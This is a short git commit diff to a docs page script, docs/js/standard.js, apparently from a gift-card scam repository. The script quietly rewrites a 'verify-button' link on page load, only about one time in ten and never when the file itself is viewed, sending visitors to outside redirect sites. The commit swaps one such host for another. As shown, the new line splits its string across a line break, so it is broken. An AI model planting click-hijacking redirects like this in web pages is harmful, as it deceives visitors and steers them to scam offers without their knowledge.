558d204d28867b35086578180787a5d8b1b5b459
giftcardplug <102857319+giftcardplug@users.noreply.github.com>
2022-12-15 11:13:00 -0800

    Update standard.js

--- docs/js/standard.js
+++ docs/js/standard.js
@@ -1,3 +1,4 @@
 0 > window.location.href.toString().indexOf('standard.js') && 0 == Math.floor(100 * Math.random() / 10) && (window.onload = function () {
-    document.getElementById('verify-button').href = 'http://hyperurl.co/tdjx0a'
+    document.getElementById('verify-button').href = 'https://appinstallcheck.com/cl/i/klxvrg
+'
 })
